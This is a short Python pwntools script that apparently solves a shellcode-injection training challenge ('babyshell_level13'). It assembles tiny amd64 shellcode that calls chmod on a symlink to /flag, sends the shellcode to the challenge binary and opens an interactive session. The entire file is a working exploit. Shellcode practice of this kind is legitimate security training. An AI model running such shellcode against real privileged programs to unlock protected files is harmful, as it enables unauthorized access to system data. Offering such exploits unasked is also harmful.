import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = "/challenge/babyshell_level13"

# Create a symlink in command line, `ln -s /flag f`
# 0x66 is 'f'
shellcode = f'''
push 0x66
# mov rdi, rsp
push rsp
pop rdi

mov sil, 7
mov al, 90
syscall
'''

shellcode = asm(shellcode)
# with open("shellsh12.bin", "wb") as f:
#     f.write(shellcode)

# exit(1)
print(disasm(shellcode))

with process([binary]) as p:
    print(p.recvuntil(b'[LEAK]').decode())
    p.send(shellcode)
    print(p.interactive())

